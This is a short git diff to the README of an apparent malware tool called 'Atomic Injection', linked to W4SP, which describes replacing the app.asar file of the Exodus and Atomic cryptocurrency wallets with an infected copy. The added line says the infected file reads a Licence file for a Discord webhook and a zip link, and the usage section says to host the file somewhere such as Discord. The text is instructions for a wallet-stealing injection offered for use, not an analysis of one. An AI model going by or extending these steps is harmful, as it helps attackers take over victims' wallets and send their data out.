@@ -17,7 +17,8 @@ Atomic Injection by [@loTus01](https://github.com/loTus04) ~ W4SP
 
 ## Explanation
 Exodus and Atomic are nodejs cold wallets, they use a app.asar file to work.<br>
-We will replace the wallet app.asar file with our infected one<br>
+We will replace the wallet app.asar file with our infected one.<br>
+The infected asar file will read a Licence file to get the discord webhook and the zip link
 
 ## Usage
 - Host the app.asar file anywhere (like discord)
